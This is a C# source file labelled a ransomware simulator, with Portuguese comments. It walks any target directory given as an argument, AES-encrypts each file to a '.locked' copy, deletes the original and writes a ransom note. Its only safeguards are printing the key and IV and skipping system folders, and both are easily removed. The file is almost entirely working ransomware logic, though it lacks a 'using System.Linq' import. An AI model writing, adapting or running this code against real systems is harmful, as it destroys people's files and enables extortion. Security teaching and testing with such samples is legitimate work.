using System;
using System.Collections.Generic;
using System.IO;
using System.Security.Cryptography;
using System.Threading.Tasks;

class RansomwareSimulator
{
    private readonly List<string> _encryptedFiles = new List<string>();
    private readonly byte[] _key;
    private readonly byte[] _iv;
    private const string EncryptedExtension = ".locked";
    private const string RansomNote = "RANSOM_NOTE.txt";
    private const int BufferSize = 8192; // 8KB buffer

    public RansomwareSimulator()
    {
        using (var aes = Aes.Create())
        {
            _key = aes.Key; // Chave simétrica gerada
            _iv = aes.IV;   // Vetor de inicialização
        }
    }

    public async Task ExecuteAsync(string targetDirectory = @"C:\Teste")
    {
        Console.WriteLine($"Iniciando ransomware em: {targetDirectory}. Ctrl+C pra cancelar.");

        if (!Directory.Exists(targetDirectory))
        {
            Directory.CreateDirectory(targetDirectory);
            Console.WriteLine($"Diretório {targetDirectory} criado. Adicione arquivos pra testar.");
            return;
        }

        try
        {
            await ProcessDirectoryAsync(targetDirectory);
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Erro geral: {ex.Message}");
            return;
        }

        GenerateRansomNote(targetDirectory);
        Console.WriteLine($"Criptografia concluída. Arquivos afetados: {_encryptedFiles.Count}. Verifique a nota.");
        Console.WriteLine($"Chave de descriptografia (TESTE): {Convert.ToBase64String(_key)}"); // Exibe a chave pra reverter
        Console.WriteLine("Pressione qualquer tecla pra sair.");
        Console.ReadKey();
    }

    private async Task ProcessDirectoryAsync(string directory)
    {
        try
        {
            var files = Directory.EnumerateFiles(directory, "*.*", SearchOption.AllDirectories);
            foreach (var file in files)
            {
                if (!IsExcludedFile(file))
                {
                    Console.WriteLine($"Criptografando: {file}");
                    await EncryptFileAsync(file);
                }
            }
        }
        catch (UnauthorizedAccessException ex)
        {
            Console.WriteLine($"Acesso negado em {directory}: {ex.Message}");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Erro em {directory}: {ex.Message}");
        }
    }

    private bool IsExcludedFile(string path)
    {
        var excludedExtensions = new[] { ".exe", ".dll", ".sys", ".bat", ".ps1", ".locked" };
        string lowerPath = path.ToLower();
        return excludedExtensions.Any(e => lowerPath.EndsWith(e)) ||
               lowerPath.Contains("windows") ||
               lowerPath.Contains("program files") ||
               lowerPath.Contains("system volume information");
    }

    private async Task EncryptFileAsync(string filePath)
    {
        try
        {
            string encryptedPath = filePath + EncryptedExtension;
            using (var aes = Aes.Create())
            {
                aes.Key = _key;
                aes.IV = _iv;

                using (var inputFs = new FileStream(filePath, FileMode.Open, FileAccess.Read))
                using (var outputFs = new FileStream(encryptedPath, FileMode.Create, FileAccess.Write))
                using (var cryptoStream = new CryptoStream(outputFs, aes.CreateEncryptor(), CryptoStreamMode.Write))
                {
                    await inputFs.CopyToAsync(cryptoStream);
                    await cryptoStream.FlushFinalBlockAsync();
                }
            }

            File.Delete(filePath);
            _encryptedFiles.Add(encryptedPath);
            Console.WriteLine($"Criptografado: {encryptedPath}");
        }
        catch (IOException ex)
        {
            Console.WriteLine($"Falha ao criptografar {filePath}: {ex.Message}");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Erro ao criptografar {filePath}: {ex.Message}");
        }
    }

    private void GenerateRansomNote(string targetDirectory)
    {
        try
        {
            string notePath = Path.Combine(targetDirectory, RansomNote);
            if (File.Exists(notePath)) File.Delete(notePath);

            var note = "RANSOMWARE SIMULADO - TESTE EDUCACIONAL\n\n" +
                      "Seus arquivos foram criptografados.\n\n" +
                      "Para descriptografar, use a chave exibida no console.\n\n" +
                      $"Arquivos afetados ({_encryptedFiles.Count}):\n" +
                      $"{string.Join("\n", _encryptedFiles.Take(5))}\n\n" +
                      "Isto é um TESTE. Use a chave abaixo pra reverter.\n\n" +
                      $"Chave de descriptografia (base64): {Convert.ToBase64String(_key)}\n" +
                      $"IV de descriptografia (base64): {Convert.ToBase64String(_iv)}\n\n" +
                      "FIM DO TESTE.";

            File.WriteAllText(notePath, note);
            Console.WriteLine($"Nota de resgate gerada em: {notePath}");
        }
        catch (Exception ex)
        {
            Console.WriteLine($"Falha na nota: {ex.Message}");
        }
    }

    static async Task Main(string[] args)
    {
        var ransomware = new RansomwareSimulator();
        string target = args.Length > 0 ? args[0] : @"C:\Teste";
        await ransomware.ExecuteAsync(target);
    }
}